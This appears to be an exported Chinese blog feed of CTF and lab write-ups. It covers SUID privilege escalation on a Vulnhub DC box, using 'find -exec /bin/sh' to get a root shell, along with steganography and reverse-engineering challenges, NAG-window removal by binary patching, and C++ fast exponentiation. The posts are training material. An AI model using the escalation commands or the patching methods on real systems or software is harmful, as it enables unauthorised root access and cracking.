<h4 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h4><p>suid提权：可以让调用者以文件拥有者的身份运行该文件。<br>使用命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find / -type f -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/10/14/hXKulnJAjt8mq91.png" alt="68S@SCS_BE_AW@WPW2152V8.png"><br>可运行的所有SUID可执行文件</p>
<blockquote>
<p>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000-print2&gt;/dev/null<br>find / -user root -perm -4000-exec ls -ldb {} ;</p>
</blockquote>
<p>随便找一个命令进行利用，就找find，发现其确实是root用户权限的SUID的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~$ touch getflag  //创建一个文件</span><br><span class="line">~$ find / -type f -name getflag -exec &quot;whoami&quot; \;  //通过find..exec 查找文件后并执行命令</span><br><span class="line">root</span><br><span class="line">~$ find / -type f -name getflag -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/10/14/XgsUQMR9Llh8JAz.png" alt="0VCSD8~6C_W_2__WDR8T_OY.png"></p>
<p>成功提权。</p>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>Vulnhnb</tag>
        <tag>DC</tag>
      </tags>
  </entry>
  <entry>
    <title>HBNIS2019</title>
    <url>/2019/09/21/HBNIS2019/</url>
    <content><![CDATA[<h1 id="0x01-Doc是什么鬼"><a href="#0x01-Doc是什么鬼" class="headerlink" title="0x01 Doc是什么鬼"></a>0x01 Doc是什么鬼</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>直接打开可以得到如图<br><img src="https://i.loli.net/2019/09/21/j2hoJCAx6izrpRO.jpg" alt="TU@HXO_Y9_3R@4U_WPA__GH.jpg"></p>
<p>放到linux看一下<br><img src="https://i.loli.net/2019/09/21/snDiJzVkASRhIXH.png" alt="_WOJ7_T_@4R_OCB8TWW6JGS.png"><br>嗯，zip压缩包，直接改后缀<br><img src="https://i.loli.net/2019/09/21/nXI6U4KrGReZ7HO.png" alt="P1HT`SX_AGD@K_BDEMR_AUL.png"></p>
<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>解压得<br><img src="https://i.loli.net/2019/09/21/jn9rEJD63Qa4ecT.png" alt="___`4A__EYC_DCU_1PFDQWA.png"></p>
<h1 id="0x02-爱因斯坦"><a href="#0x02-爱因斯坦" class="headerlink" title="0x02 爱因斯坦"></a>0x02 爱因斯坦</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>打开看，如图<br><img src="https://i.loli.net/2019/09/21/FMkWd6Qw3ERKShu.png" alt="_O_Y2T_C2F__YMST__R24JK.png"><br>属性查看一波<br><img src="https://i.loli.net/2019/09/21/lyEWSFnxAYgi31h.png" alt="__1S@___ERO1_K@3_02G7U4.png"><br>嗯，得到这一串不是flag得字符串，<br>继续分析<br><img src="https://i.loli.net/2019/09/21/Fv6bw9hysmndtSf.png" alt="A6N__X361GDL`RPLUACL_3M.png"><br>图片里含有一个压缩包，使用命令binwalk -e 解压此文件得到下图一个zip压缩包和一个flag.txt，但这个flag里啥也没有<br><img src="https://i.loli.net/2019/09/21/5id4hLOBoufETYa.png" alt="OU2UBFZ89O1~_84SJ1PTIO5.png"><br>将压缩包解压，却要密码，想起属性里得那串字符串，输进去成功，成功解压，又得到一个flag.txt</p>
<h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h2><p><img src="https://i.loli.net/2019/09/21/hxbsE8QmM9XTzql.png" alt="4IBI_RILX_9_XX64Y4_KS_N.png"></p>
<h1 id="0x03-奇怪的数字"><a href="#0x03-奇怪的数字" class="headerlink" title="0x03 奇怪的数字"></a>0x03 奇怪的数字</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>题目下载后如下图<br><img src="https://i.loli.net/2019/09/22/lPmnJ3zjx4SRc1d.png" alt="FEV_I`H6@AYS_AM53FTIC_6.png"><br>分别打开看一下<br><img src="https://i.loli.net/2019/09/22/wxRF1L9DYOWHiyd.png" alt="_81_0H1IY_~WUTGFG0JU_UD.png"></p>
<p>滴滴答答应该是摩斯电码，短为 .  长为 - 空格为 ，翻译一下为.- .-.. .–. …. .- .-.. .- -…<br><a href="http://rumkin.com/tools/cipher/morse.php" target="_blank" rel="noopener">在线摩斯电码</a>翻译一波得到<br><img src="https://i.loli.net/2019/09/22/LmhiKqZaF8ABVRo.png" alt="4TGH_QR@S9639_8Q4_I4_QT.png"><br>这不是flag，我刚开始以为和奇怪密码组合啥的，奇怪密码题目给出提示手机九键，直接打入这串数字，发现行不通…最后，33代表3键的第3个字母，依次打出来：flagisilovephone<br><img src="https://i.loli.net/2019/09/22/xIRPd3a7qjkih6K.png" alt="20K__4KE_O6@_9P2M9`CO1A.png"></p>
<h2 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h2><p>没错，这两题放一起flag却是其中的一个，即flag{flagisilovephone}，感觉是不是出题的时候打包错了….</p>
<h1 id="0x04-aduio-amp-mimi（misc之音频）"><a href="#0x04-aduio-amp-mimi（misc之音频）" class="headerlink" title="0x04 aduio &amp; mimi（misc之音频）"></a>0x04 aduio &amp; mimi（misc之音频）</h1><h2 id="aduio"><a href="#aduio" class="headerlink" title="aduio"></a>aduio</h2><p>打开<br><img src="https://i.loli.net/2019/09/22/6kcNMlQi3OxR19D.png" alt="LEZWY6WDJ@O04_G_~S7_H1P.png"><br>嗯，我听了下啥也没有，直接放到Audacity里，如下图</p>
<p><img src="https://i.loli.net/2019/09/22/SqyX7zZkD1CowBM.png" alt="BY`_XWC_8_Z~_5P57PPGE_J.png"><br>分析波形</p>
<p><img src="https://i.loli.net/2019/09/22/xJrwd1cRIf2qGUa.png" alt="E3XK0@E3_CFK~ID~I4_48AQ.png"></p>
<p>按照如图方法整理得到：<br>01100010 01100001 01101011 01100100 01101111 01110010<br><a href="http://www.ab126.com/goju/1711.html" target="_blank" rel="noopener">在线转ascill</a><br><img src="https://i.loli.net/2019/09/22/4xRcUMVe65Li9kB.png" alt="WP`3_K_5@JM___5O__AQSVP.png"><br>按照题目提示，需要md5加密</p>
<p><img src="https://i.loli.net/2019/09/22/HJinpDIfV6A57sF.png" alt="_H1QT369_63_IE_R9586UWN.png"></p>
<h2 id="mimi"><a href="#mimi" class="headerlink" title="mimi"></a>mimi</h2><p>打开文件，如图<br><img src="https://i.loli.net/2019/09/22/MtRGkTqEcd3LOwu.png" alt="5_1P`_~Q_8ZUR9VRZ9UG0SL.png"></p>
<p>听一下MP3，是卡农的片段，zip压缩包需要密码，故密码肯定就是mp3文件中获得，使用MP3Stego</p>
<ul>
<li><p>1.将mp3文件放在解密目录下<img src="https://i.loli.net/2019/09/22/Mn21ioHBZaJtALO.png" alt="9K___K1VXUID2R_2LKN___I.png"></p>
</li>
<li><p>2.cd到此目录<br><img src="https://i.loli.net/2019/09/22/wYHljgxNsJ9ZaqQ.png" alt="_JHSN_65``RA_H_ADYYB0@H.png"></p>
</li>
<li><p>3.使用如下命令：Decode.exe -X -P 密码 文件<br><img src="https://i.loli.net/2019/09/22/d9zMuHRSkFIBqYG.png" alt="QN0C_S868G7DJELX~__LQ0F.png"><br>即可发现目录下多了一个txt文件，这就是压缩包的密码<br><img src="https://i.loli.net/2019/09/22/afzm5V8kto73Pxq.png" alt="YPN_`BSIXXG_J3B3CA23_H9.png"><br>打开压缩包有一个pic_png.txt文件，猜测是png文件，在最后看到=，猜测是base64加密<br><img src="https://i.loli.net/2019/09/22/7K18vpuVqWH6yNc.png" alt="7L__VUBBP_~I_R5UXPLQ4N8.png"><br><img src="https://i.loli.net/2019/09/22/xrIqX3oDEdzZCAf.png" alt="__4BW6_XQ3CIL7HIJ_K_B_Y.png"></p>
</li>
</ul>
<p>手动或者脚本加上89 50 4E 47 0D 0A 1A 0A，png文件头<br>将base64解密后的数据补充在后就能得到png文件</p>
<p><img src="https://i.loli.net/2019/09/22/voD9h2ENbktQYUG.png" alt="Y_TXPAYOF_`0G_GZMSFE_90.png"></p>
<p><img src="https://i.loli.net/2019/09/22/GqK3wpVHEauh548.png" alt="6YS_WS_7NQ4W_K_FFTF__4I.png"></p>
<p>附上大佬的代码</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fo</span><span class="params">()</span>:</span> </span><br><span class="line">    f=open(<span class="string">'C:/Users/lenovo/Desktop/zip/pic_png.txt'</span>).read() </span><br><span class="line">    fsave=open(<span class="string">'C:/Users/lenovo/Desktop/zip/pic.png'</span>,<span class="string">'wb'</span>) </span><br><span class="line">    addHeader=<span class="string">"89 50 4E 47 0D 0A 1A 0A"</span>.replace(<span class="string">' '</span>,<span class="string">""</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    fsave.write(addHeader) </span><br><span class="line">    fsave.write(base64.b64decode(f))</span><br><span class="line">    fsave.close() </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	fo()</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'okk'</span></span><br></pre></td></tr></table></figure>

<h1 id="0x05楼梯"><a href="#0x05楼梯" class="headerlink" title="0x05楼梯"></a>0x05楼梯</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>受大佬指点，学习大佬思想<br>打开图片<br><img src="https://i.loli.net/2019/09/23/b5IAvlm4rLDk9z6.png" alt="A_QT_TRU_IO3E_Z9YSF50GR.png"><br>按照惯例检查属性</p>
<p><img src="https://i.loli.net/2019/09/23/XSnfpVrQJEdu5c9.png" alt="W_IE_Z7ZD3KP_8__Q7_0N@K.png"><br>没有任何有价值的东西，binwalk检查也只是单纯的一张png文件<br>放入notepad++<br><img src="https://i.loli.net/2019/09/23/v6AJRH3VWdcszxq.png" alt="P5QM89MRN`Z`L52_NF__DAV.png"></p>
<p>最后这里为base64加密串<br>顺便提一下base64编码特征</p>
<ul>
<li>字符串只可能包含A-Z，a-z，0-9，+，/，=</li>
<li>字符串长度是4的倍数</li>
<li>=只会出现在字符串最后，可能没有或者一个等号或者两个等号</li>
</ul>
<p>将这串字符使用在线工具解密得如下<br><img src="https://i.loli.net/2019/09/23/bJSRQ6WOvPFiUsk.png" alt="_OIT3HHS`@7_OWDE_GQ1@ZW.png"><br>使用异或爆破（0~255）<br><img src="https://i.loli.net/2019/09/23/3owit4bPT2G6XMl.png" alt="ZH@_GQM_U_KMWK4CDPUKBX0.png"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a=<span class="string">'gm`fz Y2^B3^w0^c1|'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(len(a)):</span><br><span class="line">		flag+=chr(ord(a[j])^i)</span><br><span class="line">	<span class="keyword">print</span> (flag)</span><br><span class="line">	flag=<span class="string">''</span></span><br></pre></td></tr></table></figure>

<h1 id="下次继续更新"><a href="#下次继续更新" class="headerlink" title="下次继续更新"></a>下次继续更新</h1>]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>xctf-re题</title>
    <url>/2019/09/09/re%E9%A2%98/</url>
    <content><![CDATA[<h1 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h1><p><img src="https://i.loli.net/2019/09/09/nL34eDdkJRvl5t7.png" alt="03LTYC_BU_Z5M84HVB_8O5J.png"></p>
<h2 id="只看while算法"><a href="#只看while算法" class="headerlink" title="只看while算法"></a>只看while算法</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">s=<span class="string">'c61b68366edeb7bdce3c6820314b7498'</span></span><br><span class="line">t1=<span class="string">'SharifCTF&#123;????????????????????????????????&#125;'</span></span><br><span class="line"></span><br><span class="line">t=[]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> t1:</span><br><span class="line">    t.append(x)</span><br><span class="line"></span><br><span class="line">v5=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> v5&lt;len(s):</span><br><span class="line">    <span class="keyword">if</span> v5&amp;<span class="number">1</span>:</span><br><span class="line">        v3=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        v3=<span class="number">-1</span></span><br><span class="line">    t[v5+<span class="number">10</span>]=str(chr(ord(s[v5])+v3))</span><br><span class="line">	v5=v5+<span class="number">1</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> t:</span><br><span class="line">	flag+=x</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h2 id="内存中寻找"><a href="#内存中寻找" class="headerlink" title="内存中寻找"></a>内存中寻找</h2><p>:( 看了wp才知道，涨知识<br>/tmp/flag为linux下一个临时文件夹<br>在写入时进行一步fseek函数，根据汇编，可以确定jnb loc_4008B5就是fseek()函数，那么，mov eax,[rbp+var_3C]肯定就是最后要得到的flag了<br><img src="https://i.loli.net/2019/09/09/PoxVHjhiX3aCqWz.png" alt="BT___U9B2O_7P0M97_4Q2DO.png"><br><img src="https://i.loli.net/2019/09/09/oG8td6k4sWzXlrb.png" alt="M5R1U3NIRR7JS``_NCYJS3O.png"></p>
<h1 id="python-trade"><a href="#python-trade" class="headerlink" title="python-trade"></a>python-trade</h1><blockquote>
<p>.pyc &gt; .py<br><img src="https://i.loli.net/2019/09/11/JvMbBeuz1X4jcmA.png" alt="H64B~YU`K2M~941A37_77B9.png"><br><img src="https://i.loli.net/2019/09/11/ZMregCatRVDbw3h.png" alt="@LEC6Q_~_MZYE_N7PUCHYSE.png"></p>
</blockquote>
<p><img src="https://i.loli.net/2019/09/11/eRmsX3S8UTlkjLo.png" alt="3___3Q_G`H_SU4JJ0S@KK3E.png"></p>
<h1 id="csaw2013reversing2"><a href="#csaw2013reversing2" class="headerlink" title="csaw2013reversing2"></a>csaw2013reversing2</h1><p>运行如下图<br><img src="https://i.loli.net/2019/09/16/NqxQv4UyBT1OEtk.png" alt="7__ZTLOK18YT_T_26UREZ_U.png"><br>拉入od中，寻找ascii码或者unicode，查找关键字符</p>
<p><img src="https://i.loli.net/2019/09/16/HmKxBol3ACPgzSp.png" alt="`__LRQ_~_O_FR0_____J_3L.png"><br>如上图可见出现了两个flag,随便点进一个</p>
<p><img src="https://i.loli.net/2019/09/16/d8gtEsvKbF7Jkzw.png" alt="_DIQZWLJT~___EV__938HC5.png"><br>如图所示，简单观察这两个flag附近的跳转函数<br><img src="https://i.loli.net/2019/09/16/XN2Hjd4gxKThEG7.png" alt="MSCB4Y_B__TFB11N_00EFGF.png"><br>上图值得注意的是je跳转下的int3暂停<br><img src="https://i.loli.net/2019/09/16/WOzCmj97KE2rIwP.png" alt="_EYF__7ZKM~58`8_0_6__6L.png](https://i.loli.net/2019/09/16/YeQtNWJ3R5Xhvjp.png)
下断点，f8
![HQG_WV7_V@_`B_J_88_DTG3.png"><br><img src="https://i.loli.net/2019/09/16/jqaOIdWMF4Y7ic1.png" alt="JH_@FWV__EAG@2_H_E2G~V4.png"><br><img src="https://i.loli.net/2019/09/16/A6JxEGzeKwsnfZH.png" alt="L7IA6_HL2@6_QQW5_7BQU_W.png"><br>发现第一个flag的位置并未执行，第二个flag的位置出现了第一个flag的字符，并出现弹框，说明字符串形成还需往上寻找，即jnz，试着修改并执行第一个flag位置<br><img src="https://i.loli.net/2019/09/16/mfv5rXKBoz97Uiq.png" alt="CE_H5RWV2DD~@AGS`_S_84A.png"><br><img src="https://i.loli.net/2019/09/16/nIxNWjvBCtMo9mc.png" alt="HO__28X612_I@_E64_W_KWN.png"><br>修改jnz跳过int3后发现第一个flag位置执行到call 0x00f1000不再出现乱码</p>
<p>继续执行，发现跳过了第二个flag位置，如下图<br><img src="https://i.loli.net/2019/09/16/dUsfpSLHqZB9yCT.png" alt="NY~_07___W0JEAQHC_BQ9_C.png"><br>故现在应该修改0x00f010a3的jmp指令，跳转到第二个flag位置，执行成功出现正确flag<br><img src="https://i.loli.net/2019/09/16/yH6otFmaAXZKbsr.png" alt="M__AO_VM5FR1DGX_6CL2V_1.png"></p>
<h1 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h1><p>改日再说</p>
<h1 id="re-for-50-plz-50"><a href="#re-for-50-plz-50" class="headerlink" title="re-for-50-plz-50"></a>re-for-50-plz-50</h1><p><img src="https://i.loli.net/2019/09/17/pqWhPCUAugJver5.png" alt="K__V1XN73N1_F8_R_1_OK2D.png"><br>简单看汇编 大概懂 字符串加异或</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">a=<span class="string">""</span></span><br><span class="line">b=<span class="string">"cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>):</span><br><span class="line">	a += chr(ord(b[i])^<span class="number">0x37</span>)</span><br><span class="line"></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>

<h1 id="simple-check-100"><a href="#simple-check-100" class="headerlink" title="simple-check-100"></a>simple-check-100</h1><p>下载的附件中有三个文件，首先打开exe文件<br><img src="https://i.loli.net/2019/09/29/YS9qxiIAMCfzpnr.png" alt="G`DX__VGJHA4_F9U_2`L4HM.png"><br>执行后弹出，放入od<br><img src="https://i.loli.net/2019/09/29/Mi9GVmJ8yB1vwS3.png" alt="1XWS0U8TJUSI_L0EE2LD43Q.png"><br>搜索ascii码，如图，选择wrong<br><img src="https://i.loli.net/2019/09/29/xuoLKqQNrP2XI4S.png" alt="2N26_TY~5K3483F_DQ6GEY6.png"><br>在key：处下断点，逐步跟过<br><img src="https://i.loli.net/2019/09/29/adzvtb9WLcpBXk5.png" alt="GTSL_L1_C_D2HNMKN~_@@80.png"><br>je指令ZF=1说明相等则跳转<br><img src="https://i.loli.net/2019/09/29/A8JC5zlniLMIVRj.png" alt="VLUNCAQE3_4_HD6V7R9G496.png"><br>可以直接nop掉<br><img src="https://i.loli.net/2019/09/29/S8wg6YAmzLqkrUK.png" alt="DTFX97V__@I__5XT__5COQJ.png"><br>可看到<br><img src="https://i.loli.net/2019/09/29/3BLn27cWCyFUHz8.png" alt="6I_3N618K~1IHX08TI68BUG.png"><br>感觉这就是flag了，但是跟进去找到了循环函数也无果。。。一直都是乱码<br>于是用elf文件去gdb中，顺便也放到ida中可以看关键汇编语句在哪。。<br><img src="https://i.loli.net/2019/09/29/dLjk3QKYgZulTXH.png" alt="VG_CH_Q_5L_CB0ZOTHK5JMY.png"><br><img src="https://i.loli.net/2019/09/29/DF3raZOnbGfcW1l.png" alt="T__SL___ATZ0@DJ7_85E9MP.png"><br>查看eax的值，设置eax=1，c继续执行<br><img src="https://i.loli.net/2019/09/29/XoJ6FWdeOyDVn1u.png" alt="~NS_KZRNUO_3U84AT8M_8A5.png"></p>
<h1 id="re1-100"><a href="#re1-100" class="headerlink" title="re1-100"></a>re1-100</h1><p>嗯，放入ida中，查看主函数关键部分</p>
<p><img src="https://i.loli.net/2019/09/29/lNLXfEov7Jj1ZTh.png" alt="_1LU8_VGNI7_VTUI15GINAR.png"><br>大概看一下 { 开头 然后53… 最后以 } 结尾 最后一部分49…<br>查看confuseKey函数的伪代码可知，修改顺序即可。<br><img src="https://i.loli.net/2019/09/29/NUhtEdpRQsDyCkS.png" alt="_XIWDF7_ZL_V8YSX__2BVFW.png"></p>
<p><img src="https://i.loli.net/2019/09/29/4nZucoqRsIdj23N.png" alt="1V__@_AI@22S_KA__NRC_@B.png"></p>
]]></content>
      <categories>
        <category>re</category>
      </categories>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>NAG总结</title>
    <url>/2019/09/08/nag%E5%8E%BB%E9%99%A4/</url>
    <content><![CDATA[<p>对于NAG窗口去除总结，持续更新</p>
<h1 id="4C"><a href="#4C" class="headerlink" title="4C"></a>4C</h1><h2 id="VB"><a href="#VB" class="headerlink" title="VB"></a>VB</h2><p><img src="https://i.loli.net/2019/09/08/Ro3mFYqpeiWztDM.png" alt="A_9UU9LWGC6KL_Y~YK_BICU.png"></p>
<blockquote>
<p>vb程序入口特点：push + call(JMP后跟着MSVBVM50)</p>
</blockquote>
<ul>
<li>1.在数据窗口中定位到上图中push的地址 + 4C</li>
</ul>
<p><img src="https://i.loli.net/2019/09/08/fltp6kVrcAQWI8i.png" alt="W2__BVDMF2ZZGKTZ3N15S@A.png"><br><img src="https://i.loli.net/2019/09/08/wSIxh3epRZPqEym.png" alt="A87469LZ_B_PD6VE0~1566M.png"></p>
<ul>
<li>2.右键-&gt;follow dword in dump</li>
</ul>
<p><img src="https://i.loli.net/2019/09/08/19iYtUM38kTGsFc.png" alt="B7UGLBQ_J7EAQLGB47_@O_0.png"></p>
<ul>
<li>3.更改上图中的00 01顺序后即可以跳过NAG窗口</li>
</ul>
<p><img src="https://i.loli.net/2019/09/08/593AvFwWNYiLrk7.png" alt="LAM11E@@K4I`D__0OM4O2ZY.png"></p>
<h2 id="跳过"><a href="#跳过" class="headerlink" title="跳过"></a>跳过</h2><p>直接找到neg的开始部分填充retn，进行跳过<br><img src="https://i.loli.net/2019/09/11/8RfqdZ7lJWeMwDP.png" alt="ETBY~IAO5P_FL@0L_SVL_2Q.png"></p>
]]></content>
      <categories>
        <category>re</category>
      </categories>
      <tags>
        <tag>re</tag>
        <tag>crackme</tag>
        <tag>od</tag>
      </tags>
  </entry>
  <entry>
    <title>C++</title>
    <url>/2019/08/29/C++/</url>
    <content><![CDATA[<h1 id="矩阵快速幂"><a href="#矩阵快速幂" class="headerlink" title="矩阵快速幂"></a>矩阵快速幂</h1><h2 id="对于快速幂的理解"><a href="#对于快速幂的理解" class="headerlink" title="对于快速幂的理解"></a>对于快速幂的理解</h2><p>对于数据的次方运算所利用的时间复杂度通常为O(N)，当数据过大的时候时间往往会超时，利用快速幂算法可将时间复杂度降至O(log2N)。如ab mod p应该先判断次方b为奇数或者为偶数，可以利用位运算实现，即b&amp;1，偶数时b&amp;1=0，奇数时b&amp;1=1。当b偶数时将b&gt;&gt;1（b/=2）,a<em>=a，例如2<sup>8</sup>=(2<sup>2</sup>)<sup>4</sup>=((2<sup>2</sup>)<sup>2</sup>)<sup>2</sup>；b为奇数时先将结果ans</em> a，从而继续进行 b &gt;&gt;1,a<em>=a，例如2<sup>9</sup>=2</em> 2<sup>8</sup>=2<em>((2<sup>2</sup>)<sup>2</sup>)<sup>2</sup>。若需要实现取余，应在(a</em>=a)%=p和(ans*=a)%=p时进行取余操作。</p>
<h3 id="简单快速幂模板"><a href="#简单快速幂模板" class="headerlink" title="简单快速幂模板"></a>简单快速幂模板</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function">ll  <span class="title">fun</span><span class="params">(ll a,ll b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ll sum=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(b)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(b&amp;<span class="number">1</span>)   <span class="comment">//b&amp;1==0则b为偶数</span></span><br><span class="line">            sum=(sum*a)%<span class="number">1000</span>; <span class="comment">//取余操作</span></span><br><span class="line">        b/=<span class="number">2</span>;</span><br><span class="line">        a=a*a%<span class="number">1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ll t,a;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    a = fun(<span class="number">2</span>,t); <span class="comment">//求2^n</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;a;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="二进制的符号操作"><a href="#二进制的符号操作" class="headerlink" title="二进制的符号操作"></a>二进制的符号操作</h4><p>“&lt;&lt;” 向左移n位：相当于原数乘以2的n次方。</p>
<blockquote>
<p>26&lt;&lt;1<br>26转换成2进制为 0001 1010 向左移一位补0 得 0011 0100 = 52</p>
</blockquote>
<p>“&gt;&gt;” 向右移n位：相当于原数除以2得n次方。</p>
<h2 id="例题1（快速幂进阶）"><a href="#例题1（快速幂进阶）" class="headerlink" title="例题1（快速幂进阶）"></a>例题1（快速幂进阶）</h2><p> <a href="https://ac.nowcoder.com/acm/contest/903/B" target="_blank" rel="noopener">详情请戳戳我！！！！</a> </p>
<p><img src="https://i.loli.net/2019/08/29/uK1dzX5iUf4DQhB.png" alt="AE7KU4J06E_43I_XJGEBU8T.png"></p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="https://i.loli.net/2019/09/08/W6ktSZ3TnjiIGlw.png" alt="B__AM8_59KCVEFFH7`Z_ZAU.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span> mod; <span class="comment">//全局余数</span></span><br><span class="line">ll tmp[N][N];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">multi</span><span class="params">(ll a[][N],ll b[][N],<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(tmp,<span class="number">0</span>,<span class="keyword">sizeof</span> tmp);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;n;k++)</span><br><span class="line">                tmp[i][j]+=a[i][k]*b[k][j]%mod;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">            a[i][j]=tmp[i][j]%mod;</span><br><span class="line">&#125;</span><br><span class="line">ll res[N][N]</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pow</span><span class="params">(ll a[][N],<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(res,<span class="number">0</span>,<span class="keyword">sizeof</span> res);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++) res[i][i]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(n&amp;<span class="number">1</span>)</span><br><span class="line">            multi(res,a,N);</span><br><span class="line">        multi(a,a,N);</span><br><span class="line">        n&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    <span class="keyword">while</span>(T--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> n,q;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;q&gt;&gt;n&gt;&gt;mod;</span><br><span class="line">        ll a[<span class="number">2</span>][<span class="number">2</span>]=&#123;<span class="number">1</span>,<span class="number">0</span>,q,q&#125;;</span><br><span class="line">        <span class="built_in">pow</span>(a,n<span class="number">-1</span>);</span><br><span class="line">        ll ans=q*res[<span class="number">0</span>][<span class="number">0</span>]%mod+q*res[<span class="number">1</span>][<span class="number">0</span>]%mod;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ans%mod&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="例题2-模板题"><a href="#例题2-模板题" class="headerlink" title="例题2(模板题)"></a>例题2(模板题)</h2><p><a href="https://www.luogu.org/problem/P3390" target="_blank" rel="noopener">详情戳戳我！！！！</a><br>给定n*n的矩阵A，求A^k</p>
<blockquote>
<p>输入格式<br>第一行，n,k<br>第2至n+1行，每行n个数，第i+1行第j个数表示矩阵第i行第j列的元素</p>
</blockquote>
